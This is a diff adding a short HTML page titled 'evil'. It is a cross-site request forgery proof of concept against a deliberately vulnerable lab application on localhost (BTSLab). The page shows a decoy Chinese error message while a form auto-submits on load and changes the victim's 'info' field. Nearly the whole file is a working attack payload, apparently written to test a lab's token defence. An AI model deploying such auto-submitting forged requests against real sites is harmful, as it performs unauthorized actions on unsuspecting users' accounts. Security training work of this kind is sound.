@@ -1,0 +1,23 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="description" content="this" />
+    <meta name="keywords" content="this" />
+    <title>evil</title>
+</head>
+
+
+<body>
+页面好像有点问题，请联系管理员
+<form action="http://127.0.0.1/btslab/vulnerability/csrf/changeinfo_fixed_token.php" method="POST">
+    <input type="text" name="info" value="腾讯是我家11"/>
+    <input type="submit" name="change" value="Change"/>
+</form>
+
+<script> document.forms[0].submit(); </script>
+
+</body>
+
+</html>
+
